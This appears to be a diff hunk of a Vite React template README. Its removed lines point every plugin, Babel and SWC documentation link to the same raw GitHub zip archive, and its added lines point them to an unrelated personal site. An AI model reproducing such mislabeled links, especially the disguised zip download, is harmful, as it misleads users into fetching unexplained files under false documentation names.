@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/FilipStanic/book-review/master/public/review-book-1.0.zip) uses [Babel](https://raw.githubusercontent.com/FilipStanic/book-review/master/public/review-book-1.0.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/FilipStanic/book-review/master/public/review-book-1.0.zip) uses [SWC](https://raw.githubusercontent.com/FilipStanic/book-review/master/public/review-book-1.0.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://filipstanic.github.io) uses [Babel](https://filipstanic.github.io) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://filipstanic.github.io) uses [SWC](https://filipstanic.github.io) for Fast Refresh
